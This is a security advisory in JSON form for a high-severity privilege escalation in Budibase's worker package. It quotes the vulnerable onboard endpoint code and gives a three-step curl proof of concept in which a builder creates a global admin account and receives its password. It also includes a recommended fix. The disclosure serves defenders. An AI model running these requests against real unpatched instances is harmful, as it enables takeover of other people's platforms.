@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-18T17:42:25Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@budibase/worker"
+  },
+  "Advisory": {
+    "DatabaseId": 356435,
+    "Id": "GSA_kwCzR0hTQS1jNTRqLXhwOTItd2gyOM4ABXBT",
+    "GhsaId": "GHSA-c54j-xp92-wh28",
+    "References": [
+      {
+        "Url": "https://github.com/Budibase/budibase/security/advisories/GHSA-c54j-xp92-wh28"
+      },
+      {
+        "Url": "https://github.com/Budibase/budibase/releases/tag/3.38.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-c54j-xp92-wh28"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-c54j-xp92-wh28"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-45716"
+      }
+    ],
+    "Description": "## Summary\n\nThe `POST /api/global/users/onboard` endpoint is protected by `workspaceBuilderOrAdmin` middleware, allowing any user with builder permissions to access it. When SMTP email is not configured (the default for self-hosted Budibase instances), this endpoint bypasses the admin-restricted invite flow and directly creates users via `bulkCreate`, accepting arbitrary `admin` and `builder` role assignments from the request body. A builder-level user can create a new global admin account and receive the generated password in the response, achieving full privilege escalation.\n\n## Details\n\nThe vulnerability stems from a mismatch between the authorization level of the `onboardUsers` endpoint and the user-creation capabilities it exposes when SMTP is not configured.\n\n**Route definition** (`packages/worker/src/api/routes/global/users.ts:93-109`):\n```typescript\nbuilderOrAdminRoutes  // \u003c-- allows builders, not just admins\n  .post(\n    \"/api/global/users/onboard\",\n    buildInviteMultipleValidation(),\n    controller.onboardUsers\n  )\n```\n\nCompare with the `invite` and `inviteMultiple` endpoints which are correctly admin-only:\n```typescript\nadminRoutes  // \u003c-- admin only\n  .post(\"/api/global/users/invite\", buildInviteValidation(), controller.invite)\n  .post(\"/api/global/users/multi/invite\", buildInviteMultipleValidation(), controller.inviteMultiple)\n```\n\n**Controller** (`packages/worker/src/api/controllers/global/users.ts:601-630`):\n```typescript\nexport const onboardUsers = async (ctx) =\u003e {\n  if (await isEmailConfigured()) {\n    await inviteMultiple(ctx)  // admin-only path (delegates to invite flow)\n    return\n  }\n\n  // No SMTP → directly create users with attacker-controlled roles\n  const users = ctx.request.body.map(invite =\u003e {\n    const password = generatePassword(12)\n    createdPasswords[invite.email] = password\n    return {\n      email: invite.email,\n      password,\n      forceResetPassword: true,\n      roles: invite.userInfo.apps || {},\n      admin: { global: !!invite.userInfo.admin },  // \u003c-- attacker-controlled\n      builder: invite.userInfo.builder,              // \u003c-- attacker-controlled\n      tenantId: tenancy.getTenantId(),\n    }\n  })\n\n  let resp = await userSdk.db.bulkCreate(users)\n  for (const user of resp.successful) {\n    user.password = createdPasswords[user.email]  // \u003c-- password returned!\n  }\n  ctx.body = { ...resp, created: true }\n}\n```\n\n**Middleware pass-through** (`packages/backend-core/src/middleware/workspaceBuilderOrAdmin.ts:10-26`):\n\nIn the worker context (`env.isWorker()` is `true`), when there is no `workspaceId` parameter in the request (which there isn't for the onboard endpoint), the middleware at line 19 checks `!workspaceId \u0026\u0026 env.isWorker()` — this is `true`, so it falls through to line 21 which only checks `hasBuilderPermissions`. Any global builder passes.\n\n**Validation gap** (`buildInviteMultipleValidation` at line 37-45): The Joi schema validates `userInfo` as `Joi.object().optional()` with no constraints on its contents, so `admin` and `builder` fields pass through.\n\n**No downstream check**: `bulkCreate` and `buildUser` do not strip or validate admin/builder fields — they are written directly to the user document in CouchDB.\n\n## PoC\n\n**Prerequisites:** A self-hosted Budibase instance (default: no SMTP configured) and a user account with builder-level access.\n\n**Step 1:** Authenticate as a builder user and obtain the session cookie:\n```bash\n# Login as builder\ncurl -s -c cookies.txt -X POST 'http://localhost:10000/api/global/auth/default/login' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"builder@example.com\",\"password\":\"builderpassword\"}'\n```\n\n**Step 2:** Create a new global admin user via the onboard endpoint:\n```bash\ncurl -s -X POST 'http://localhost:10000/api/global/users/onboard' \\\n  -H 'Content-Type: application/json' \\\n  -b cookies.txt \\\n  -d '[{\"email\":\"pwned-admin@attacker.com\",\"userInfo\":{\"admin\":{\"global\":true}}}]'\n```\n\n**Expected response** (includes the generated password):\n```json\n{\n  \"successful\": [{\"email\":\"pwned-admin@attacker.com\",\"password\":\"\u003cgenerated-12-char-password\u003e\",\"admin\":{\"global\":true},...}],\n  \"unsuccessful\": [],\n  \"created\": true\n}\n```\n\n**Step 3:** Login as the new admin:\n```bash\ncurl -s -X POST 'http://localhost:10000/api/global/auth/default/login' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"pwned-admin@attacker.com\",\"password\":\"\u003cpassword-from-step-2\u003e\"}'\n```\n\nThe attacker now has full global admin access.\n\n## Impact\n\n- **Privilege escalation:** Any builder-level user can escalate to global admin on self-hosted Budibase instances without SMTP configured (the default deployment).\n- **Full platform compromise:** Global admin can access all apps, all data sources, manage all users, delete apps, and modify platform configuration.\n- **Credential exposure:** The generated password is returned in the HTTP response, giving the attacker immediate access to the new admin account.\n- **Stealth:** The created user appears as a legitimately onboarded user, making detection difficult without audit log review.\n- **Wide applicability:** Self-hosted Budibase instances commonly run without SMTP configuration, making this the default-exploitable path.\n\n## Recommended Fix\n\nMove the `onboardUsers` route from `builderOrAdminRoutes` to `adminRoutes` to match the authorization level of `invite` and `inviteMultiple`:\n\n```diff\n--- a/packages/worker/src/api/routes/global/users.ts\n+++ b/packages/worker/src/api/routes/global/users.ts\n-builderOrAdminRoutes\n+adminRoutes\n   .post(\n     \"/api/global/users/onboard\",\n     buildInviteMultipleValidation(),\n     controller.onboardUsers\n   )\n```\n\nAdditionally, the `onboardUsers` controller should validate that the caller has sufficient permissions to assign the requested role level. Even admin users should not be able to create users with roles exceeding their own. Consider adding explicit validation in the controller:\n\n```typescript\n// In onboardUsers, before bulkCreate:\nfor (const invite of ctx.request.body) {\n  if (invite.userInfo.admin \u0026\u0026 !ctx.user.admin?.global) {\n    ctx.throw(403, \"Only admins can create admin users\")\n  }\n}\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-18T17:42:24Z",
+    "Severity": "HIGH",
+    "Summary": "Budibase: Builder-to-Admin Privilege Escalation via onboardUsers Endpoint Without SMTP Configuration",
+    "UpdatedAt": "2026-05-18T17:42:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.38.1"
+      },
+      "VulnerableVersionRange": "\u003c 3.38.1"
+    }
+  ]
+}
